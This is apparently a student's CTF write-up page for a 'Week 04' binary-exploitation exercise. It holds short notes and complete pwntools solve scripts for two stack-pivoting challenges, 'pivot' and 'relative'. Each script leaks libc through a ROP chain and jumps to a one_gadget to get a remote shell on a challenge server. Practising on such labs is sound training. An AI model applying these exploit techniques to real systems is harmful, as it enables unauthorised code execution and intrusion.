+++
title = "Week 04"
weight = 3
slug="week-04"
description = "- pivot: stack pivoting, the address of user input is leaked and leave;ret instructions are used to get to ropchain<br>- relative: stack pivoting by using add rsp instructions"
+++

This was the first week where things were pretty difficult for me. I will add writeups to these ones for sure, still barely understand how I did these.

# pivot
Stack pivoting, the address of your input is leaked, and you can use leave; ret to jump to it. From there it's a ret2libc.

Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./pivot_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7011)

    return r


def main():
    r = conn()

    # good luck pwning :)

    rbp_val = p64(0x3ff000)
    rdi_ret = p64(0x4012bb)
    leave_ret = p64(0x401183)
    puts_got = p64(exe.got['puts'])
    puts_plt = p64(exe.plt['puts'])
    query = p64(exe.sym['query'])

    payload = rbp_val + rdi_ret + puts_got + puts_plt + query
    
    print(r.recvline())
    # sending the payload to the first query()
    r.sendline(payload)
    name = r.recvline().strip().split()[-1]
    name = p64(int(name, 16))
    print('name:', name)
    # send to first vuln()
    r.send(b'B'*8 + name + leave_ret)

    leak = r.recvline()
    base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

    onegadget = p64(base + 0x4484f)
    zero_rax = p64(base + 0x980f5)

    print(r.recvline())
    r.sendline(b'C'*7 + zero_rax + onegadget)   # idk why but there was a weird null byte in this one that meant I only have to send 7 bytes of buffer. 
                                                # Spent ages trying to figure out why my payload was offset by 1 byte but couldn't figure it out, still have no idea
    name2 = r.recvline().strip().split()[-1]
    name2 = p64(int(name2, 16))
    print('name2:', name2)

    r.send(b'D'*8 + name2 + leave_ret)

    r.interactive()


if __name__ == "__main__":
    main()
```

# relative
Stack pivoting by using add rsp instructions. The add rsp, 8 instruction conveniently makes it so it returns directly onto our input.

Solve script:
``` py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./relative_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        gdb.attach(r)
    else:
        r = remote("128.199.12.141", 7012)

    return r

def main():
    r = conn()

    # good luck pwning :)
    BUFSIZE = 40
    rdi_ret = p64(0x40125b)
    puts_plt = p64(exe.plt['puts'])
    puts_got = p64(exe.got['puts'])
    main = p64(0x4011af)
    add_rsp_8 = p64(0x401012)[:-1]

    # only 7 bytes remaining, msb must be 0x00. Not much of an issue b/c all addresses can be specified in 7 bytes    

    payload = rdi_ret + puts_got + puts_plt + main
    payload += b'A'*(BUFSIZE-len(payload))

    r.recvline()
    r.send(payload + add_rsp_8)

    leak = r.recvline()
    base = u64(leak.rstrip().ljust(8, b'\x00')) - libc.symbols['puts']

    onegadget = p64(base+0x4484f)
    zero_rax = p64(base+0x0980f5)

    payload2 = b'B'*24 + zero_rax + onegadget

    r.sendline(payload2)

    r.interactive()


if __name__ == "__main__":
    main()
```
